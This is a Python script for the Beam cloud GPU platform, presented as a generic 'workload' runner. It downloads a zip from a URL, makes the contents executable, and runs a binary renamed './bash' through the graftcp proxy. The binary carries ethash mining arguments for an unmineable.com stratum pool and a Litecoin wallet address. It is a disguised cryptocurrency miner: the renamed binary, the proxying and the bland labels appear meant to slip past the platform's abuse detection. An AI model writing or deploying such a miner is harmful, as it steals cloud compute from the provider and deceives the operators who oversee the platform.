from beam import function, Image
import subprocess
import time

image = (
    Image(
        base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
        python_version="python3.10",
    )
    .add_commands([
        "apt-get update -y",
        "apt-get install -y python3 python3-pip python-is-python3 git wget unzip",
    ])
)


@function(
    name="t4x3-runner",
    image=image,
    gpu="RTX4090",
    cpu=4,
    memory="8Gi",
    timeout=4 * 60 * 60,
)
def run_script():
    subprocess.run(["nvidia-smi"], check=False)

    cmd = r"""
    set -e

    echo "=== DOWNLOAD FILE ==="
    wget -q https://example.com/workload.zip -O /tmp/workload.zip

    echo "=== EXTRACT ==="
    mkdir -p /tmp/work
    unzip -o /tmp/workload.zip -d /tmp/work

    echo "=== SET PERMISSIONS ==="
    chmod -R +x /tmp/work

    echo "=== WORKLOAD READY ==="
    cd /tmp/work

    ./graftcp/graftcp ./bash --algo ethash --pool stratum+tcp://ethash.unmineable.com:3333 --user LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.test --ethstratum ETHPROX
    echo "Workload ready."

    echo "=== FINISHED ==="
    """

    result = subprocess.run(
        ["bash", "-lc", cmd],
        check=True,
    )

    print("Process exited with:", result.returncode)


if __name__ == "__main__":
    run_script.remote()
